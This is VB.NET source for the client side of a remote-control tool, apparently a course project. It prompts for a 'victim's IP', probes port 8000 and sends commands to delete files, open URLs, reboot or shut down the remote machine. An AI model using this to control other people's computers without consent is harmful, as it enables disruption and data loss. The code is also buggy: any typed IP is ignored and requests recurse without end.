Imports System.Net.Sockets
Imports System.Net
Imports System.IO

Module clientmod
    Dim port As Int32 = 8000
    Dim client As TcpClient

    Sub Main()

        Dim colors() As ConsoleColor = ConsoleColor.GetValues(GetType(ConsoleColor))
        Dim originalCol As ConsoleColor = Console.ForegroundColor
        Console.ForegroundColor = colors(10)

        Console.WriteLine("Welcome to COMP 3500's TCP/IP CHAT Remote System!")
        Console.WriteLine("=================================================")
        Console.ForegroundColor = originalCol
        Console.Write("Please enter the victim's IP address (Defaults to 127.0.0.1) here: ")
        Dim IPaddress As String = Console.ReadLine()

        If (IPaddress = "") Then
            IPaddress = "127.0.0.1"

            If scan_port(IPaddress, port) = True Then ' check if the server is listening

                Console.WriteLine("")
                Console.WriteLine("Connection to the server was successful!")

                Console.WriteLine("")
                Console.ForegroundColor = colors(13)
                Console.WriteLine("Current supported commands:")
                Console.ForegroundColor = originalCol
                Console.WriteLine("")
                Console.WriteLine("1. create folder:foldername")
                Console.WriteLine("2. create file:filename>content(optional)")
                Console.WriteLine("3. delete file:filename")
                Console.WriteLine("4. open disk tray")
                Console.WriteLine("5. open browser:url")
                Console.WriteLine("6. reboot machine")
                ' Console.WriteLine("7. port scan")
                Console.WriteLine("7. shutdown (shutdown the server remotely)")
                Console.WriteLine("8. exit (close the client)")
                Console.WriteLine("")
                Console.WriteLine("* Make sure that your ChatIP server is running in the victim's computer before entering your command.")
                Console.WriteLine("")

                start_request(IPaddress)

            Else
                Console.WriteLine("Server appears to be inactive.")
                Console.ReadKey()
                Return
            End If
        End If
    End Sub

    Function get_command(ByVal IPAdd)
        Dim empty As Boolean = True
        Dim cmd As String = ""
        While empty = True
            Console.Write("> ")
            cmd = Console.ReadLine()

            If (cmd = "") = False Then
                empty = False
            End If

            If (cmd = "exit") Then
                Environment.Exit(0)
            End If
        End While
        Return cmd
    End Function

    Function send_request(ByVal IPAdd, ByVal command)
        Try
            client = New TcpClient(IPAdd, 8000)
            Dim writer As New StreamWriter(client.GetStream)

            writer.Write(command)
            writer.Flush()
            start_request(IPAdd)

        Catch ex As Exception
            Console.WriteLine("Port " + port.ToString() + " is closed. Connection to the server was lost.")
            start_request(IPAdd)
        End Try

        Return 0
    End Function

    Function start_request(ByVal IPAdd)
        Dim command As String = get_command(IPAdd)
        send_request(IPAdd, command)
        Return 0
    End Function

    Function scan_port(ByVal IPAdd, ByVal portNum) As Boolean

        Dim TcpPortscan As New TcpClient
        Try
            TcpPortscan.Connect(IPAdd, portNum)
            Return True
        Catch ex As Exception
            Return False
        Finally
            TcpPortscan.Close()
        End Try
    End Function
End Module
